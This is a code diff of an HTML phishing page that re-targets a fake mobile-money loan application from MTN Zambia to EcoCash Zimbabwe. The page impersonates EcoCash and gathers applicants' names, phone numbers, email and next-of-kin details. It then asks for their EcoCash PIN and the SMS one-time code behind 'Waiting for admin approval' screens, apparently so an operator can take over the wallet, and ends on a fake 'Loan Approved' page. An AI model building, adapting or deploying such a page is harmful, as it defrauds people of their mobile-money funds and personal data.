@@ -2,151 +2,155 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN Zambia – Easy Loans</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>EcoCash Zimbabwe – Easy Loans</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="./style.css" />
 </head>
 <body>
 
     <!-- PAGE 1: LANDING -->
     <div id="page-landing" class="page active">
-        <header class="app-header">
-            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
-            <div class="header-title">Easy Loans</div>
-            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
-        </header>
-
+        <div class="land-nav">
+            <div style="flex:1;"></div>
+            <h1 class="eco-logo-text"><span class="eco">Eco</span><span class="cash">Cash</span></h1>
+            <div style="flex:1;"></div>
+        </div>
         <div class="land-center">
             <div class="land-card">
-                <h1 data-i18n="welcome">Welcome to MTN Zambia</h1>
-                <p class="land-tagline" data-i18n="tagline">Fast, easy loans through MTN MoMo</p>
-                <div class="calc-box">
-                    <h2 data-i18n="calculator">Loan Calculator</h2>
-                    <div class="calc-row2"><span data-i18n="amount">Amount</span><span class="cv" id="calcAmt">500 ZMW</span></div>
-                    <div class="calc-row2"><span data-i18n="term">Term</span><span class="cv" id="calcTerm">30 Days</span></div>
-                    <input type="range" id="amtSlider" min="500" max="10000" step="100" value="500" oninput="updateCalc()" />
-                    <div class="range-ends"><span>500 ZMW</span><span>10,000 ZMW</span></div>
-                    <div class="monthly-box"><span class="ml" data-i18n="monthly">Monthly Payment</span><span class="ma" id="monthlyAmt">525 ZMW</span></div>
-                </div>
-                <button class="btn-grad" onclick="startApplication()" data-i18n="start">START APPLICATION</button>
+                <h2>Welcome to EcoCash Zimbabwe</h2>
+                <p>Get loans easily through EcoCash Zimbabwe</p>
+                <button class="btn-grad" onclick="startApplication()">START APPLICATION</button>
             </div>
         </div>
-        <div class="land-footer" data-i18n="footer">© 2026 MTN Zambia – Easy Loans</div>
+        <div class="land-footer">© 2026 EcoCash Loans – Powered by Econet Zimbabwe</div>
     </div>
 
-    <!-- PAGE 2: STEP 1 -->
+    <!-- PAGE 2: STEP 1 – Loan Details -->
     <div id="page-step1" class="page">
-        <header class="app-header">
-            <a class="nav-left" onclick="goTo('page-landing')">←</a>
-            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
-            <div class="header-title">Easy Loans</div>
-            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
-        </header>
-
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
+            <h1 class="eco-logo-text"><span class="eco">Eco</span><span class="cash">Cash</span></h1>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
         <div class="step-center">
             <div class="step-card">
-                <h2 data-i18n="loan_application">Loan Application</h2>
-                <p class="step-sub" data-i18n="step1_sub">Step 1 of 4</p>
+                <h2>Loan Details</h2>
+                <p class="step-sub">Step 1 of 4</p>
                 <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
-                <div class="field"><label data-i18n="loan_type">Loan Type</label><div class="sel-wrap"><select id="s1ty"><option data-i18n="personal">Personal Loan</option><option selected data-i18n="business">Business Loan</option><option data-i18n="home">Home Loan</option><option data-i18n="student">Student Loan</option></select></div></div>
-                <div class="field"><label data-i18n="loan_amount">Amount (ZMW)</label><input type="number" id="s1am" value="500" placeholder="Amount" oninput="clearErr('s1Err')" /></div>
-                <div class="field"><label data-i18n="loan_term">Term</label><div class="sel-wrap"><select id="s1te"><option data-i18n="d30">30 Days</option><option data-i18n="d60">60 Days</option><option data-i18n="d90">90 Days</option></select></div></div>
-                <div class="field"><label data-i18n="purpose">Purpose</label><textarea id="s1pu" placeholder="Describe the purpose of your loan..." oninput="clearErr('s1Err')"></textarea></div>
-                <button class="btn-grad" onclick="toS2()" data-i18n="next">NEXT STEP</button>
+                <div class="field">
+                    <label>Loan Amount ($100 - $1,000)</label>
+                    <input type="range" id="s1am" min="100" max="1000" step="10" value="200" oninput="updateStep1Calc()" />
+                    <div class="range-ends"><span>$100</span><span>$1,000</span></div>
+                    <p style="text-align:center;font-weight:600;color:#1e63c6;font-size:1.2rem;" id="s1AmtDisplay">$200</p>
+                </div>
+                <div class="field">
+                    <label>Duration (14 - 120 days)</label>
+                    <input type="range" id="s1dur" min="14" max="120" value="30" oninput="updateStep1Calc()" />
+                    <div class="range-ends"><span>14 days</span><span>120 days</span></div>
+                    <p style="text-align:center;font-weight:600;color:#1e63c6;font-size:1.2rem;" id="s1DurDisplay">30 days</p>
+                </div>
+                <div class="calc-box" style="margin-top:10px;">
+                    <div class="calc-row2"><span>Principal Amount:</span><span class="cv" id="s1Principal">$200.00</span></div>
+                    <div class="calc-row2"><span>Interest (0.5% daily):</span><span class="cv" id="s1Interest">$30.00</span></div>
+                    <div class="calc-row2" style="font-weight:700;font-size:1.1rem;"><span>Total Repayable:</span><span class="cv" id="s1Total">$230.00</span></div>
+                </div>
+                <div class="field">
+                    <label>Reason for Loan</label>
+                    <textarea id="s1reason" placeholder="e.g. School fees, Business expansion, Medical bills..." oninput="clearErr('s1Err')"></textarea>
+                </div>
+                <button class="btn-grad" onclick="toS2()">NEXT STEP</button>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 3: STEP 2 -->
+    <!-- PAGE 3: STEP 2 – Personal Details -->
     <div id="page-step2" class="page">
-        <header class="app-header">
-            <a class="nav-left" onclick="goTo('page-step1')">←</a>
-            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
-            <div class="header-title">Easy Loans</div>
-            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
-        </header>
-
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
+            <h1 class="eco-logo-text"><span class="eco">Eco</span><span class="cash">Cash</span></h1>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
         <div class="step-center">
             <div class="step-card">
-                <h2 data-i18n="loan_application">Loan Application</h2>
-                <p class="step-sub" data-i18n="step2_sub">Step 2 of 4</p>
+                <h2>Personal Details</h2>
+                <p class="step-sub">Step 2 of 4</p>
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
                 <div class="field-row">
-                    <div class="field"><label data-i18n="first_name">First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')" /></div>
-                    <div class="field"><label data-i18n="last_name">Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')" /></div>
+                    <div class="field"><label>First Name</label><input type="text" id="s2fi" placeholder="First Name" oninput="clearErr('s2Err')" /></div>
+                    <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="Last Name" oninput="clearErr('s2Err')" /></div>
                 </div>
                 <div class="field">
-                    <label data-i18n="phone_label">Phone Number (Zambia)</label>
-                    <div class="phone-row"><div class="ph-pre">+260</div><input type="tel" id="s2ph" placeholder="9X XXX XXXX" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')" /></div>
-                    <div class="field-hint" data-i18n="phone_hint">9 digits without +260 prefix (e.g., 971234567)</div>
+                    <label>Phone Number (Zimbabwe)</label>
+                    <div class="phone-row"><div class="ph-pre">+263</div><input type="tel" id="s2ph" placeholder="7XX XXX XXX" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')" /></div>
+                    <div class="field-hint">9 digits without +263 prefix (e.g., 712345678)</div>
                 </div>
-                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step1')" data-i18n="back">BACK</button><button class="btn-grad" onclick="toS3()" data-i18n="next">NEXT STEP</button></div>
+                <div class="field"><label>Email Address</label><input type="email" id="s2em" placeholder="your@email.com" oninput="clearErr('s2Err')" /></div>
+                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step1')">BACK</button><button class="btn-grad" onclick="toS3()">NEXT STEP</button></div>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 4: STEP 3 -->
+    <!-- PAGE 4: STEP 3 – Next of Kin & Submit -->
     <div id="page-step3" class="page">
-        <header class="app-header">
-            <a class="nav-left" onclick="goTo('page-step2')">←</a>
-            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
-            <div class="header-title">Easy Loans</div>
-            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
-        </header>
-
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
+            <h1 class="eco-logo-text"><span class="eco">Eco</span><span class="cash">Cash</span></h1>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
         <div class="step-center">
             <div class="step-card">
-                <h2 data-i18n="loan_application">Loan Application</h2>
-                <p class="step-sub" data-i18n="step3_sub">Step 3 of 4</p>
+                <h2>Next of Kin</h2>
+                <p class="step-sub">Step 3 of 4</p>
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
-                <div class="field"><label data-i18n="employment">Employment Status</label><div class="sel-wrap"><select id="s3em"><option data-i18n="employed">Employed</option><option selected data-i18n="self_employed">Self-employed</option><option data-i18n="unemployed">Unemployed</option><option data-i18n="retired">Retired</option></select></div></div>
-                <div class="field"><label data-i18n="annual_income">Annual Income (ZMW)</label><input type="number" id="s3in" placeholder="Annual income" oninput="clearErr('s3Err')" /></div>
-                <div class="field"><label data-i18n="kin_name">Next of Kin Name</label><input type="text" id="s3kn" placeholder="Full name of next of kin" oninput="clearErr('s3Err')" /></div>
-                <div class="field"><label data-i18n="kin_phone">Next of Kin Phone</label><input type="tel" id="s3kp" placeholder="+260 9X XXX XXXX" oninput="clearErr('s3Err')" /></div>
-                <div class="sum-box">
-                    <h3 data-i18n="summary">Application Summary</h3>
-                    <div class="sum-row"><span class="sk" data-i18n="loan_amount">Amount:</span><span class="sv" id="sA">500 ZMW</span></div>
-                    <div class="sum-row"><span class="sk" data-i18n="loan_term">Term:</span><span class="sv" id="sT">30 Days</span></div>
-                    <div class="sum-row"><span class="sk" data-i18n="purpose">Purpose:</span><span class="sv" id="sP">—</span></div>
-                    <div class="sum-row"><span class="sk" data-i18n="applicant">Applicant:</span><span class="sv" id="sN">—</span></div>
+                <div class="field-row">
+                    <div class="field"><label>Kin First Name</label><input type="text" id="s3kf" placeholder="Kin's first name" oninput="clearErr('s3Err')" /></div>
+                    <div class="field"><label>Kin Last Name</label><input type="text" id="s3kl" placeholder="Kin's last name" oninput="clearErr('s3Err')" /></div>
                 </div>
-                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step2')" data-i18n="back">BACK</button><button class="btn-grad" onclick="submitApp()" data-i18n="submit">SUBMIT APPLICATION</button></div>
+                <div class="field">
+                    <label>Kin Phone Number</label>
+                    <div class="phone-row"><div class="ph-pre">+263</div><input type="tel" id="s3kp" placeholder="7XX XXX XXX" maxlength="9" oninput="normalizePhone('s3kp');clearErr('s3Err')" /></div>
+                </div>
+                <div class="field">
+                    <label>Province</label>
+                    <div class="sel-wrap">
+                        <select id="s3prov">
+                            <option value="">Select Province</option>
+                            <option>Harare</option><option>Bulawayo</option><option>Manicaland</option>
+                            <option>Mashonaland East</option><option>Mashonaland West</option><option>Masvingo</option>
+                            <option>Midlands</option><option>Matabeleland North</option><option>Matabeleland South</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="sum-box">
+                    <h3>Application Summary</h3>
+                    <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">$200</span></div>
+                    <div class="sum-row"><span class="sk">Duration:</span><span class="sv" id="sT">30 Days</span></div>
+                    <div class="sum-row"><span class="sk">Total Repayable:</span><span class="sv" id="sR">$230.00</span></div>
+                    <div class="sum-row"><span class="sk">Applicant:</span><span class="sv" id="sN">—</span></div>
+                </div>
+                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step2')">BACK</button><button class="btn-grad" onclick="submitApp()">SUBMIT APPLICATION</button></div>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 5: PROCESSING -->
-    <div id="page-processing" class="page">
-        <div style="background:linear-gradient(160deg, #FFCC00, #E6B800); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
-            <div class="proc-wrap">
-                <div class="proc-icon">⏳</div>
-                <h2 data-i18n="processing">Processing Application...</h2>
-                <p data-i18n="processing_sub">Please wait while we process your application</p>
-                <div id="processingStatus" style="margin-top:20px; font-size:0.9rem; color:#004F9F;" data-i18n="awaiting">⏳ Awaiting admin approval...</div>
-            </div>
-        </div>
-    </div>
-
-    <!-- PAGE 6: PIN (6 DIGITS) -->
+    <!-- PAGE 5: PIN -->
     <div id="page-pin" class="page">
-        <header class="app-header">
-            <a class="nav-left" onclick="goTo('page-processing')">←</a>
-            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
-            <div class="header-title">Easy Loans</div>
-            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
-        </header>
-
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-step3')">← Back</a>
+            <h1 class="eco-logo-text"><span class="eco">Eco</span><span class="cash">Cash</span></h1>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
         <div class="step-center">
             <div class="step-card">
-                <h2 data-i18n="enter_pin">Enter MTN MoMo PIN</h2>
-                <p class="step-sub" data-i18n="pin_step_sub">Final verification step</p>
+                <h2>Enter EcoCash PIN</h2>
+                <p class="step-sub">Step 4 of 4</p>
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
                 <div class="msg-box error" id="pinErr"><span class="msg-icon">✕</span><span id="pinErrTxt"></span></div>
-                <div class="pin-label" data-i18n="pin_label">Enter your MTN MoMo PIN (6 digits):</div>
+                <div class="pin-label">Enter your EcoCash PIN (5 digits):</div>
                 <div id="pinAttemptsDisplay" class="pin-attempts">🔑 Attempts remaining: 3 of 3</div>
                 <div class="pin-row">
                     <input type="password" id="pin0" class="pin-box" maxlength="1" oninput="pinMvM(this,0)" placeholder="•" />
@@ -154,161 +158,113 @@
                     <input type="password" id="pin2" class="pin-box" maxlength="1" oninput="pinMvM(this,2)" placeholder="•" />
                     <input type="password" id="pin3" class="pin-box" maxlength="1" oninput="pinMvM(this,3)" placeholder="•" />
                     <input type="password" id="pin4" class="pin-box" maxlength="1" oninput="pinMvM(this,4)" placeholder="•" />
-                    <input type="password" id="pin5" class="pin-box" maxlength="1" oninput="pinMvM(this,5)" placeholder="•" />
                     <button class="pin-eye" onclick="togPin()" title="Show/Hide">👁</button>
                     <button class="pin-delete" onclick="clearLoginPin()" title="Delete PIN">✕</button>
                 </div>
-                <button class="btn-grad" onclick="doPin()" data-i18n="submit_pin">SUBMIT PIN</button>
+                <div id="pinLoader" style="display:none; text-align:center; margin-top:10px; color:var(--eco-blue);">
+                    <span class="spinner"></span> Waiting for admin approval...
+                </div>
+                <button class="btn-grad" onclick="doPin()">SUBMIT ECOCASH PIN</button>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 7: WAIT PIN -->
-    <div id="page-wait-pin" class="page">
-        <div style="background:linear-gradient(135deg, #FFCC00, #E6B800); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
-            <div class="wait-wrap">
-                <div class="wait-icon">⏳</div>
-                <h2 data-i18n="verifying_pin">Verifying PIN...</h2>
-                <p data-i18n="verifying_pin_sub">Your PIN has been received. Please wait for admin verification...</p>
-                <div id="waitPinStatus" style="margin-top:20px; font-size:0.9rem; color:#004F9F;" data-i18n="admin_reviewing_pin">⏳ Admin is reviewing your PIN...</div>
-                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);" data-i18n="app_id">Application ID: <span id="waitPinAppId" style="font-family:monospace; color:#004F9F;">-</span></div>
-            </div>
-        </div>
-    </div>
-
-    <!-- PAGE 8: OTP (6 DIGITS) -->
+    <!-- PAGE 6: OTP -->
     <div id="page-otp" class="page">
-        <header class="app-header">
-            <a class="nav-left" onclick="goTo('page-wait-pin')">←</a>
-            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
-            <div class="header-title">Easy Loans</div>
-            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
-        </header>
-
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-pin')">← Back</a>
+            <h1 class="eco-logo-text"><span class="eco">Eco</span><span class="cash">Cash</span></h1>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
         <div class="step-center">
             <div class="step-card">
-                <h2 data-i18n="enter_otp">Enter OTP Code</h2>
-                <p class="step-sub" data-i18n="otp_sub">6-digit code sent via SMS</p>
+                <h2>Enter OTP Code</h2>
+                <p class="step-sub">Enter the 4-digit OTP sent to your phone via EcoCash</p>
                 <div class="otp-section">
-                    <div class="otp-section-title" data-i18n="otp_label">OTP Code (6 digits):</div>
+                    <div class="otp-section-title">OTP Code (4 digits):</div>
                     <div style="display: flex; align-items: center;">
                         <div class="otp-inputs" id="otpInputs">
-                            <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
-                            <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
-                            <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
-                            <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
-                            <input type="password" id="otp4" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
-                            <input type="password" id="otp5" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
+                            <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
+                            <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
+                            <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
                         </div>
                         <button class="otp-delete" onclick="clearOtpCode()" title="Delete OTP">✕</button>
                     </div>
                 </div>
                 <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
-                <button class="btn-grad" onclick="doOtp()" data-i18n="verify_otp">VERIFY & APPROVE</button>
+                <button class="btn-resend hidden" id="resendOtpBtn" onclick="resendOtp()">🔄 Resend OTP</button>
+                <div id="otpLoader" style="display:none; text-align:center; margin-top:10px; color:var(--eco-blue);">
+                    <span class="spinner"></span> Waiting for admin approval...
+                </div>
+                <button class="btn-grad" onclick="doOtp()" style="margin-top: 10px;">VERIFY & APPROVE LOAN</button>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 9: WAIT OTP -->
-    <div id="page-wait-otp" class="page">
-        <div style="background:linear-gradient(135deg, #FFCC00, #E6B800); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
-            <div class="wait-wrap">
-                <div class="wait-icon">⏳</div>
-                <h2 data-i18n="verifying_otp">Verifying OTP...</h2>
-                <p data-i18n="verifying_otp_sub">Your OTP has been received. Please wait for confirmation...</p>
-                <div id="waitOtpStatus" style="margin-top:20px; font-size:0.9rem; color:#004F9F;" data-i18n="admin_reviewing_otp">⏳ Verifying OTP...</div>
-                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);" data-i18n="app_id">Application ID: <span id="waitOtpAppId" style="font-family:monospace; color:#004F9F;">-</span></div>
+    <!-- PAGE 7: PROCESSING -->
+    <div id="page-processing" class="page">
+        <div style="background:linear-gradient(160deg, #1e63c6, #154ea6); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="proc-wrap">
+                <div class="proc-icon">⏳</div>
+                <h2 style="color:#fff;">Processing Application...</h2>
+                <p style="color:rgba(255,255,255,0.75);">Please wait while we process your loan application</p>
+                <div id="processingStatus" style="margin-top:20px; font-size:0.9rem; color:#ffcc00;">⏳ Awaiting admin approval...</div>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 10: APPROVAL -->
+    <!-- PAGE 8: APPROVAL -->
     <div id="page-approval" class="page">
-        <header class="app-header">
-            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
-            <div class="header-title">Easy Loans</div>
-            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
-        </header>
-
-        <div class="appr-wrap">
-            <div class="appr-top">
-                <div class="check-circle">✓</div>
-                <h1 class="appr-title" data-i18n="approved_title">Loan Approved!</h1>
-                <p class="appr-sub" data-i18n="approved_sub">Your loan has been approved and will be disbursed shortly</p>
-            </div>
-
-            <div class="appr-banner">
-                <div class="abl" data-i18n="approved_amount">Approved Amount</div>
-                <div class="aba" id="approvedAmount">500 ZMW</div>
-            </div>
-
-            <div class="comp-box">
-                <div class="ch" data-i18n="congrats">🎉 Congratulations!</div>
-                <p data-i18n="approved_msg">Your loan application has been fully approved. The funds will be sent to your MTN MoMo wallet within 24 hours.</p>
-            </div>
-
-            <div class="ld-card">
-                <div class="ld-htitle" data-i18n="loan_details">Loan Details</div>
-                <div class="ld-row">
-                    <div class="ld-icon ic-g">💰</div>
-                    <div><div class="ld-lbl" data-i18n="amount_label">Loan Amount</div><div class="ld-val" id="ldAmount">500 ZMW</div></div>
+        <div class="appr-wrap" style="background:linear-gradient(135deg, #1e63c6, #154ea6); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div style="width:100%; max-width:520px;">
+                <div style="background:#fff; border-radius:12px 12px 0 0; padding:28px 24px 0; text-align:center;">
+                    <div style="width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg, #ffcc00, #1e63c6);display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:1.3rem;color:#fff;">✓</div>
+                    <h2 style="font-size:1.2rem;font-weight:700;margin-bottom:6px;">Loan Approved!</h2>
+                    <p style="font-size:0.82rem;color:#888;margin-bottom:18px;">Your loan has been successfully approved.</p>
+                    <div style="background:linear-gradient(to right, #1e63c6, #154ea6);padding:16px;margin:0 -24px;text-align:center;">
+                        <div style="font-size:0.72rem;color:rgba(255,255,255,0.8);text-transform:uppercase;letter-spacing:0.06em;">Amount to Receive</div>
+                        <div style="font-size:2rem;font-weight:700;color:#fff;" id="aprAmount">$200</div>
+                    </div>
                 </div>
-                <div class="ld-row">
-                    <div class="ld-icon ic-b">📅</div>
-                    <div><div class="ld-lbl" data-i18n="term_label">Loan Term</div><div class="ld-val" id="ldTerm">30 Days</div></div>
+                <div style="background:#FFFBEA;border:1px solid #F5C842;padding:14px 16px;">
+                    <div style="display:flex;align-items:center;gap:6px;font-size:0.82rem;font-weight:700;color:#a07000;margin-bottom:6px;">ℹ️ Important Information</div>
+                    <p style="font-size:0.78rem;color:#7a5500;line-height:1.6;">The funds will be deposited directly to your EcoCash account within 5 minutes. Please ensure your phone number is correct.</p>
                 </div>
-                <div class="ld-row">
-                    <div class="ld-icon ic-p">📱</div>
-                    <div><div class="ld-lbl" data-i18n="phone_label2">Phone Number</div><div class="ld-val" id="ldPhone">+260 97 123 4567</div></div>
+                <div style="background:#fff;padding:20px 24px;">
+                    <div style="font-size:0.82rem;font-weight:600;color:#444;margin-bottom:14px;display:flex;align-items:center;gap:6px;">📊 Loan Details</div>
+                    <div style="display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid #f5f5f5;">
+                        <div style="width:34px;height:34px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:0.85rem;flex-shrink:0;background:linear-gradient(135deg,#2ECC71,#27AE60);color:#fff;">💰</div>
+                        <div><div style="font-size:0.72rem;color:#888;text-transform:uppercase;letter-spacing:0.04em;">Amount</div><div style="font-size:0.9rem;font-weight:600;" id="aprAmt">$200</div></div>
+                    </div>
+                    <div style="display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid #f5f5f5;">
+                        <div style="width:34px;height:34px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:0.85rem;flex-shrink:0;background:linear-gradient(135deg,#3498DB,#2980B9);color:#fff;">📅</div>
+                        <div><div style="font-size:0.72rem;color:#888;text-transform:uppercase;letter-spacing:0.04em;">Duration</div><div style="font-size:0.9rem;font-weight:600;" id="aprTerm">30 Days</div></div>
+                    </div>
+                    <div style="display:flex;align-items:center;gap:12px;padding:10px 0;">
+                        <div style="width:34px;height:34px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:0.85rem;flex-shrink:0;background:linear-gradient(135deg,#9B59B6,#8E44AD);color:#fff;">💳</div>
+                        <div><div style="font-size:0.72rem;color:#888;text-transform:uppercase;letter-spacing:0.04em;">Total Repayment</div><div style="font-size:0.9rem;font-weight:600;" id="aprMth">$230.00</div></div>
+                    </div>
                 </div>
-                <div class="ld-row">
-                    <div class="ld-icon ic-g">🆔</div>
-                    <div><div class="ld-lbl" data-i18n="app_id_label">Application ID</div><div class="ld-val" id="ldAppId" style="font-family:monospace;">-</div></div>
+                <div style="background:#fff;padding:14px 24px;display:flex;align-items:flex-start;gap:8px;border-top:1px solid #f0f0f0;">
+                    <span style="font-size:1.2rem;">📌</span>
+                    <p style="font-size:0.79rem;color:#888;line-height:1.5;"><strong>Next Steps:</strong> To start repaying, you can set up an automatic payment plan in your EcoCash account in the next section.</p>
                 </div>
-            </div>
-
-            <div class="nxt-steps">
-                <span>📌</span>
-                <p data-i18n="next_steps">Next Steps: You will receive an SMS confirmation once funds are disbursed to your MTN MoMo wallet.</p>
-            </div>
-
-            <div class="rth-wrap">
-                <button class="rth-btn" onclick="goTo('page-landing')" data-i18n="return_home">RETURN TO HOME</button>
+                <div style="background:#fff;border-radius:0 0 12px 12px;padding:14px 24px 24px;">
+                    <button style="width:100%;padding:13px;background:linear-gradient(to right,#1e63c6,#154ea6);color:#fff;border:none;border-radius:8px;font-size:0.88rem;font-weight:600;letter-spacing:0.04em;cursor:pointer;font-family:'Inter',sans-serif;" onclick="alert('Thank you! Your loan has been disbursed.')">FINISH</button>
+                </div>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 11: REJECTED -->
-    <div id="page-rejected" class="page">
-        <header class="app-header">
-            <img class="header-logo" src="mtn_logo.png" alt="MTN" />
-            <div class="header-title">Easy Loans</div>
-            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
-        </header>
-
-        <div class="appr-wrap">
-            <div class="appr-top">
-                <div class="check-circle" style="background:linear-gradient(135deg,#e74c3c,#c0392b);box-shadow:0 8px 24px rgba(231,76,60,0.35);">✕</div>
-                <h1 class="appr-title" data-i18n="rejected_title">Application Rejected</h1>
-                <p class="appr-sub" data-i18n="rejected_sub">Unfortunately, your application could not be approved at this time</p>
-            </div>
-
-            <div class="comp-box" style="background:#fef2f2;border-left-color:#c0392b;">
-                <div class="ch" style="color:#c0392b;" data-i18n="rejected_reason">Reason</div>
-                <p id="rejectionReason" data-i18n="rejected_default">Your application did not meet the required criteria. Please ensure your MTN MoMo PIN is correct and try again.</p>
-            </div>
-
-            <div class="nxt-steps" style="background:#fef2f2;">
-                <span>💡</span>
-                <p data-i18n="rejected_tip">Tip: Make sure you have sufficient balance and correct PIN. You can retry your application after 24 hours.</p>
-            </div>
-
-            <div class="rth-wrap">
-                <button class="rth-btn" onclick="goTo('page-landing')" data-i18n="return_home">RETURN TO HOME</button>
-            </div>
+    <!-- Loader for PIN/OTP (uses CSS class from style.css) -->
+    <div id="globalLoader" style="display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.5); z-index:9999; align-items:center; justify-content:center;">
+        <div style="background:#fff; padding:30px; border-radius:12px; text-align:center;">
+            <div class="spinner"></div>
+            <p>Please wait...</p>
         </div>
     </div>
 
-    <script src="script.js"></script>
+    <script src="./script.js"></script>
 </body>
 </html>
